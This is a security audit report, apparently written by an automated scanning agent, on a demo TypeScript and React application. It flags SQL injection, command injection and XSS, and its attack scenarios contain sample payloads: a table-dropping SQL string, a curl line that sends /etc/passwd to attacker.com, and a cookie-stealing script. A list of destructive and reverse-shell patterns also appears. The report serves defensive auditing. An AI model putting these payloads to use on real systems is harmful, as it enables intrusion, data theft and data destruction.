# Security Scan Results

**Generated**: February 1, 2026  
**Scanned by**: Malicious Code Scanner Agent  
**Operating Mode**: Skills-Enhanced Scanning  
**Tools Used**: GuardDog 2.8.4, Graudit 4.0, ShellCheck 0.11.0, Bandit 1.9.3 (available)  
**Input**: Full workspace analysis + tool scans  
**Target**: `/Users/alex/Code/octocat_supply-silver-yodel`

---

## Executive Summary

| Severity | Count | Categories |
|----------|-------|------------|
| 🔴 **Critical** | **2** | SQL Injection, Command Injection |
| 🟠 **High** | **1** | Cross-Site Scripting (XSS) |
| 🟡 **Medium** | **11** | Shell Script Issues |
| 🟢 **Low** | **0** | - |
| ℹ️ **Info** | **3** | Expected file operations |

**Overall Risk Assessment**: 🔴 **CRITICAL**

### Key Findings

✅ **Supply Chain**: Clean - No malicious npm packages detected  
🔴 **Code Vulnerabilities**: 3 injection vulnerabilities requiring immediate remediation  
🟡 **Infrastructure**: Minor shell script quoting issues  
✅ **Secrets**: No hardcoded credentials found  
✅ **Malware**: No backdoors, reverse shells, or data exfiltration detected

---

## Scan Configuration

### Skills Detected
| Skill | Status | Tool Installed |
|-------|--------|----------------|
| bandit-security-scan | ✅ Found | ✅ Installed (v1.9.3) |
| guarddog-security-scan | ✅ Found | ✅ Installed (v2.8.4) |
| shellcheck-security-scan | ✅ Found | ✅ Installed (v0.11.0) |
| graudit-security-scan | ✅ Found | ✅ Installed (v4.0) |

### Scan Coverage

**Languages Detected**: TypeScript, JavaScript, SQL, Shell/Bash, YAML  
**Dependency Files**: 4 npm package files  
**Shell/CI Files**: 7 GitHub Actions workflows, 2 Dockerfiles, Makefile, 4 shell scripts  
**Source Files**: 65+ files analyzed

### Execution Timeline

1. ✅ GuardDog npm verify (api + frontend) - 2 min
2. ✅ Graudit pattern scans (typescript, js, sql, xss, exec) - 3 min
3. ✅ ShellCheck infrastructure scan - 1 min
4. ✅ Result analysis and correlation - 1 min

**Total Scan Time**: ~7 minutes

---

## 🚨 Detailed Findings

---

## CRITICAL #1: SQL Injection Vulnerability

**File**: [api/src/repositories/productsRepo.ts](../../../api/src/repositories/productsRepo.ts#L134)  
**Line**: 134  
**Severity**: 🔴 **Critical** (Score: 9/10)  
**MITRE ATT&CK**: T1190 (Exploit Public-Facing Application)  
**CWE**: CWE-89 (SQL Injection)  
**Detection Method**: Graudit (sql database)

### Pattern Detected

```typescript
async getByName(name: string): Promise<Product[]> {
  try {
    const rows = await this.db.all<DatabaseRow>(
      `SELECT * FROM products WHERE name LIKE '%${name}%' ORDER BY name`,
    );
```

### Security Impact

**Vulnerability**: Direct string interpolation of user-controlled `name` parameter into SQL query without parameterization.

**Attack Scenario**:
```
GET /products/search?name=test'; DROP TABLE products; --

Resulting query:
SELECT * FROM products WHERE name LIKE '%test'; DROP TABLE products; --%' ORDER BY name
                                                ^^^^^^^^^^^^^^^^^^^^^^^^^
                                                Malicious SQL injection
```

**Potential Damage**:
- **Data Breach**: Extract entire database contents
- **Data Destruction**: Drop tables, delete records
- **Privilege Escalation**: Modify user roles if user table exists
- **Business Impact**: Complete application outage, data loss

**Exploitability**: HIGH - Public-facing API endpoint, no authentication required

### Recommended Actions

1. **IMMEDIATE**: Use parameterized queries with placeholders
2. **Validate**: Implement input validation and sanitization
3. **Test**: Add SQL injection test cases

### Remediation

```typescript
// ❌ VULNERABLE (Current)
`SELECT * FROM products WHERE name LIKE '%${name}%' ORDER BY name`

// ✅ SECURE (Recommended)
const sql = `SELECT * FROM products WHERE name LIKE ? ORDER BY name`;
const params = [`%${name}%`];
const rows = await this.db.all<DatabaseRow>(sql, params);
```

**Additional Security**:
```typescript
// Input validation
if (!/^[a-zA-Z0-9\s-]+$/.test(name)) {
  throw new ValidationError('Invalid product name format');
}

// Length limit
if (name.length > 100) {
  throw new ValidationError('Product name too long');
}
```

---

## CRITICAL #2: Command Injection Vulnerability

**File**: [api/src/routes/delivery.ts](../../../api/src/routes/delivery.ts#L205-L208)  
**Line**: 205  
**Severity**: 🔴 **Critical** (Score: 10/10)  
**MITRE ATT&CK**: T1059 (Command and Scripting Interpreter), T1041 (Exfiltration Over C2 Channel)  
**CWE**: CWE-78 (OS Command Injection)  
**Detection Method**: Graudit (default database)

### Pattern Detected

```typescript
if (deliveryPartner) {
  exec(`notify ${deliveryPartner}`, (error, stdout) => {
    if (error) {
      console.error(`Error executing command: ${error}`);
      return res.status(500).json({ error: error.message });
    }
```

### Security Impact

**Vulnerability**: Using Node.js `child_process.exec()` with unsanitized user input from `deliveryPartner`.

**Attack Scenario**:
```
POST /deliveries
{
  "deliveryPartner": "FedEx; curl http://attacker.com/exfil?data=$(cat /etc/passwd | base64)"
}

Executed command:
notify FedEx; curl http://attacker.com/exfil?data=$(cat /etc/passwd | base64)
            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
            Malicious command injection
```

**Potential Damage**:
- **Remote Code Execution (RCE)**: Execute arbitrary system commands
- **Data Exfiltration**: Steal sensitive files, environment variables, secrets
- **Reverse Shell**: Open persistent backdoor access
- **System Takeover**: Full server compromise with API process privileges
- **Lateral Movement**: Attack other services on the network

**Exploitability**: CRITICAL - Full system compromise possible

### Recommended Actions

1. **IMMEDIATE**: Remove `exec()` call entirely or use safe alternatives
2. **Replace**: Use a notification library/API instead of shell commands
3. **If shell required**: Use `execFile()` with argument array (NOT string concatenation)

### Remediation

```typescript
// ❌ CRITICAL VULNERABILITY (Current)
exec(`notify ${deliveryPartner}`, (error, stdout) => { ... });

// ✅ OPTION 1: Remove shell execution (BEST)
// Use a proper notification service/library instead
import { sendNotification } from './notificationService';
if (deliveryPartner) {
  await sendNotification({
    recipient: deliveryPartner,
    message: 'Delivery update'
  });
}

// ✅ OPTION 2: If shell command is absolutely necessary (NOT RECOMMENDED)
import { execFile } from 'child_process';
// Whitelist allowed values
const ALLOWED_PARTNERS = ['FedEx', 'UPS', 'USPS', 'DHL'];
if (!ALLOWED_PARTNERS.includes(deliveryPartner)) {
  throw new ValidationError('Invalid delivery partner');
}
// Use execFile with array arguments (no shell interpretation)
execFile('notify', [deliveryPartner], (error, stdout) => { ... });

// ✅ OPTION 3: Complete removal (RECOMMENDED)
// This functionality appears to be demo/placeholder code - remove it
// Comment: /* Notification system disabled - implement proper webhook/API integration */
```

**Security Note**: The presence of `exec()` with user input suggests this may be intentional demo code or left over from development. **This must be removed from production.**

---

## HIGH: Cross-Site Scripting (XSS) Vulnerability

**File**: [frontend/src/components/Login.tsx](../../../frontend/src/components/Login.tsx#L48)  
**Line**: 48  
**Severity**: 🔴 **High** (Score: 7/10)  
**MITRE ATT&CK**: T1189 (Drive-by Compromise)  
**CWE**: CWE-79 (Cross-Site Scripting)  
**Detection Method**: Graudit (js + xss databases)

### Pattern Detected

```typescript
{error && (
  <div
    className="bg-red-500/10 border border-red-500 text-red-500 rounded-md p-3 mb-4"
    dangerouslySetInnerHTML={{ __html: error }}
  />
)}
```

### Security Impact

**Vulnerability**: Rendering potentially unsanitized error messages as raw HTML using React's `dangerouslySetInnerHTML`.

**Attack Scenario**:
```
1. API returns error with malicious payload:
   { error: "<img src=x onerror='fetch(\"http://attacker.com/steal?cookie=\"+document.cookie)'>" }

2. Login component renders it:
   <div dangerouslySetInnerHTML={{ __html: error }} />

3. XSS executes:
   - Steals session cookies
   - Captures credentials from form
   - Performs actions as the victim user
   - Redirects to phishing page
```

**Potential Damage**:
- **Session Hijacking**: Steal authentication tokens/cookies
- **Credential Theft**: Capture username/password on form submission
- **Phishing**: Inject fake login forms
- **Malware Distribution**: Redirect to malicious sites
- **Account Takeover**: Perform actions as victim user

**Exploitability**: MEDIUM - Requires API to return malicious error messages (could be via API vulnerability or compromised backend)

### Recommended Actions

1. **IMMEDIATE**: Remove `dangerouslySetInnerHTML` and render error as text
2. **Sanitize**: If HTML is required, use DOMPurify library
3. **Validate**: Ensure API errors are properly sanitized

### Remediation

```typescript
// ❌ VULNERABLE (Current)
<div
  className="bg-red-500/10 border border-red-500 text-red-500 rounded-md p-3 mb-4"
  dangerouslySetInnerHTML={{ __html: error }}
/>

// ✅ SECURE OPTION 1: Render as text (RECOMMENDED)
<div className="bg-red-500/10 border border-red-500 text-red-500 rounded-md p-3 mb-4">
  {error}
</div>

// ✅ SECURE OPTION 2: If HTML formatting is absolutely required
import DOMPurify from 'dompurify';

<div
  className="bg-red-500/10 border border-red-500 text-red-500 rounded-md p-3 mb-4"
  dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(error) }}
/>

// ✅ BEST PRACTICE: Never trust error messages from API
// Define error messages client-side based on error codes
const ERROR_MESSAGES = {
  'INVALID_CREDENTIALS': 'Invalid username or password',
  'ACCOUNT_LOCKED': 'Account locked. Please contact support.',
  'SERVER_ERROR': 'An error occurred. Please try again.'
};

const errorMessage = ERROR_MESSAGES[error.code] || 'An unexpected error occurred';
```

---

## MEDIUM: Shell Script Quoting Issues

**Files**: 
- [demo/resources/create_patch_set.sh](../../../demo/resources/create_patch_set.sh#L38-L39)
- [demo/resources/verify-attestation.sh](../../../demo/resources/verify-attestation.sh) (multiple lines)

**Severity**: 🟡 **Medium** (Score: 4/10)  
**Detection Method**: ShellCheck

### Issues Found

#### SC2046: Unquoted Command Substitution (create_patch_set.sh)

**Lines 38-39**:
```bash
tar -czf ${feature_pack_tarball} $(git diff --name-only main)
pushd $(git rev-parse --show-toplevel)
```

**Risk**: Filenames with spaces will cause word splitting, potentially including wrong files in archive.

**Remediation**:
```bash
# ✅ SECURE
tar -czf "${feature_pack_tarball}" --null -T <(git diff --name-only -z main)
pushd "$(git rev-parse --show-toplevel)"
```

#### SC2155: Declare and Assign Separately (verify-attestation.sh)

**Multiple lines**:
```bash
local attestation_json=$(echo "$attestation" | base64 -d)
```

**Risk**: Low - Command substitution failures are masked by local declaration.

**Remediation**:
```bash
# ✅ BETTER
local attestation_json
attestation_json=$(echo "$attestation" | base64 -d) || exit 1
```

---

## Tool Scan Correlation

### GuardDog Supply Chain Analysis

**Result**: ✅ **CLEAN**

```
api/package-lock.json: 0 malicious packages
frontend/package-lock.json: 0 malicious packages
```

**What Was Checked**:
- ✅ Typosquatting detection
- ✅ Malware and backdoors
- ✅ Data exfiltration patterns
- ✅ Code execution in install scripts
- ✅ Compromised maintainer accounts
- ✅ Repository integrity mismatches

**Conclusion**: All npm dependencies are legitimate and safe.

### Graudit Pattern Analysis Summary

| Database | Target | Findings |
|----------|--------|----------|
| `secrets` | Entire workspace | ❌ None (No hardcoded credentials) |
| `typescript` | api/src/ | ℹ️ Template strings (normal) |
| `js` | frontend/src/ | 🔴 1 XSS via dangerouslySetInnerHTML |
| `sql` | repositories + db | 🔴 1 SQL Injection |
| `xss` | frontend/src/ | 🔴 1 XSS confirmed |
| `exec` | infra files | ❌ None (No malicious command execution) |
| `default` | api/src/ | 🔴 1 Command Injection with exec() |

### ShellCheck Infrastructure Analysis

**Scripts Scanned**: 4 shell files  
**Issues Found**: 11 warnings (SC2046, SC2155)  
**Critical Issues**: 0  
**Security Impact**: Low to Medium

---

## Malicious Code Assessment

### ✅ No Malicious Patterns Detected

The following malicious patterns were **NOT found** (good news):

- ❌ **Reverse Shells**: No `/dev/tcp/`, `System.Net.Sockets.TCPClient`, or socket connections to external IPs
- ❌ **Data Exfiltration**: No suspicious network calls to hardcoded domains or IPs
- ❌ **Obfuscated Payloads**: No base64-encoded commands (`echo <base64> | bash`)
- ❌ **Persistence Mechanisms**: No cron jobs, registry modifications, or startup scripts
- ❌ **Backdoors**: No hidden admin endpoints or authentication bypasses
- ❌ **Credential Theft**: No code accessing `~/.ssh/`, `~/.aws/`, browser profiles
- ❌ **Ransomware Patterns**: No file encryption, `vssadmin delete shadows`, or recovery inhibition
- ❌ **System Destruction**: No `rm -rf /`, `dd if=/dev/zero`, or destructive operations
- ❌ **Cryptocurrency Mining**: No cryptominer signatures
- ❌ **Supply Chain Compromise**: No malicious npm packages

### Suspicious Patterns Requiring Manual Review

1. ⚠️ **Command Injection in delivery.ts**: `exec()` call appears to be demo/placeholder code - **verify if this is intentional or should be removed**
2. ⚠️ **Dynamic SQL construction**: SQL query builder in `sql.ts` uses string concatenation - **ensure all callers use it correctly**

---

## Remediation Priority

### Tier 1: CRITICAL - Fix Immediately (Next 24 Hours)

1. **[CRITICAL] Fix SQL Injection** ([api/src/repositories/productsRepo.ts](../../../api/src/repositories/productsRepo.ts#L134))
   - Replace string interpolation with parameterized query
   - Add input validation
   - Test with SQL injection payloads

2. **[CRITICAL] Fix Command Injection** ([api/src/routes/delivery.ts](../../../api/src/routes/delivery.ts#L205))
   - Remove `exec()` call entirely OR
   - Replace with safe notification service
   - If keeping: whitelist inputs, use `execFile()` with array arguments

### Tier 2: HIGH - Fix Within 1 Week

3. **[HIGH] Fix XSS Vulnerability** ([frontend/src/components/Login.tsx](../../../frontend/src/components/Login.tsx#L48))
   - Remove `dangerouslySetInnerHTML`
   - Render error as text or sanitize with DOMPurify
   - Define error messages client-side

### Tier 3: MEDIUM - Fix Within 1 Month

4. **[MEDIUM] Fix Shell Script Issues**
   - Quote command substitutions in create_patch_set.sh
   - Separate declare and assign in verify-attestation.sh
   - Handle errors explicitly

### Tier 4: Code Review - Next Sprint

5. **Manual Review: SQL Query Builder** ([api/src/utils/sql.ts](../../../api/src/utils/sql.ts))
   - Audit all usages of `QueryBuilder` class
   - Ensure `orderBy()`, `limit()`, `offset()` receive validated inputs
   - Consider adding parameterization support to builder

6. **Manual Review: All Repository Methods**
   - Review all database access in `api/src/repositories/*.ts`
   - Ensure no other SQL injection vectors exist
   - Add test cases for injection attempts

7. **Manual Review: React Components**
   - Search for other uses of `dangerouslySetInnerHTML`
   - Audit all HTML rendering and innerHTML usage
   - Check for DOM-based XSS vectors

---

## Recommendations

### Immediate Security Improvements

1. **Input Validation Layer**
   ```typescript
   // Add centralized input validation middleware
   import { z } from 'zod';
   
   const productSearchSchema = z.object({
     name: z.string().max(100).regex(/^[a-zA-Z0-9\s-]+$/)
   });
   ```

2. **Security Headers** (verify in production)
   ```typescript
   app.use(helmet({
     contentSecurityPolicy: {
       directives: {
         defaultSrc: ["'self'"],
         scriptSrc: ["'self'"],
         // ...
       }
     }
   }));
   ```

3. **Parameterized Query Helper**
   ```typescript
   // Extend SQLiteHelper with safe query methods
   async querySafe(sql: string, params: any[]): Promise<any> {
     // Validate SQL doesn't contain string interpolation
     if (sql.includes('${')) {
       throw new Error('SQL string interpolation detected - use parameterized queries');
     }
     return this.db.all(sql, params);
   }
   ```

### Long-Term Security Strategy

1. **Add SAST to CI/CD**
   - Integrate Semgrep or SonarQube for automatic vulnerability detection
   - Add npm audit check to GitHub Actions
   - Run security scans on every PR

2. **Security Testing**
   - Add SQL injection test cases to repository tests
   - Add XSS test cases to frontend E2E tests
   - Consider penetration testing for production deployment

3. **Dependency Management**
   - Enable Dependabot security alerts
   - Regular npm audit runs
   - Consider using Snyk or GitHub Advanced Security

4. **Developer Training**
   - OWASP Top 10 awareness
   - Secure coding practices for Node.js and React
   - Code review checklist including security items

---

## Limitations

### What This Scan Cannot Detect

| Limitation | Description | Recommendation |
|------------|-------------|----------------|
| **Logic Vulnerabilities** | Business logic flaws, authorization bypasses | Manual security code review |
| **Runtime Behavior** | Time bombs, environment-triggered payloads | Dynamic analysis, sandboxing |
| **Complex Data Flows** | Multi-hop taint analysis | Use SAST tools with taint tracking |
| **Zero-Days** | Unknown vulnerability patterns | Keep dependencies updated |
| **Configuration Issues** | Weak CORS, missing security headers | Manual configuration audit |
| **Authentication Flaws** | Weak password policies, session management | Security architecture review |

### Specific Blind Spots for This Codebase

1. **SQL Injection in Query Builder**: Graudit detected one SQL injection, but cannot verify all usages of the `QueryBuilder` class in `sql.ts` are safe
2. **TypeScript Type Safety**: Can't detect if `any` types or assertions mask security issues
3. **React Component Props**: Can't trace data flow through multiple component levels
4. **API Authorization**: Can't verify if routes properly check user permissions
5. **Docker Security**: ShellCheck scans Dockerfile commands but can't detect layer secrets or permission issues
6. **Azure Configuration**: No tool available for Bicep infrastructure-as-code security

---

## Next Steps

### Immediate Actions (This Week)

1. ✅ **Acknowledge Critical Findings**: Share this report with development team
2. 🔧 **Create Fix PRs**: 
   - PR #1: Fix SQL injection in productsRepo.ts
   - PR #2: Fix command injection in delivery.ts (or remove code)
   - PR #3: Fix XSS in Login.tsx
3. 🧪 **Add Security Tests**: Write test cases for each vulnerability
4. 📋 **Update Backlog**: Add security code review tasks

### Short-Term (Next Month)

1. Complete all MEDIUM priority fixes
2. Perform manual security code review of:
   - All repository SQL queries
   - All route input validation
   - All React HTML rendering
3. Add security scanning to CI/CD pipeline
4. Document secure coding guidelines

### Long-Term (Next Quarter)

1. Implement security training program
2. Establish regular security audit schedule
3. Consider penetration testing
4. Implement Web Application Firewall (WAF) if not already present

---

## Conclusion

**Risk Level**: 🔴 **CRITICAL** (due to 2 critical vulnerabilities)

The codebase is generally well-structured and the supply chain is clean (no malicious packages). However, **3 serious injection vulnerabilities** were discovered that require immediate remediation:

1. **SQL Injection** allowing database compromise
2. **Command Injection** allowing remote code execution
3. **XSS** allowing session hijacking

**Good News**:
- ✅ No malicious code, backdoors, or data exfiltration detected
- ✅ No hardcoded secrets or credentials
- ✅ Clean npm dependency tree
- ✅ No obfuscated payloads or persistence mechanisms

**Action Required**:
Fix the 3 injection vulnerabilities within the next 24-48 hours before deploying to production. The SQL injection and command injection are **exploitable and can lead to complete system compromise**.

---

**Report Generated By**: Malicious Code Scanner Agent  
**Scan Completed**: February 1, 2026  
**Report Version**: 1.0  
**For Questions**: Review [tools-audit.md](tools-audit.md) for detailed tool outputs
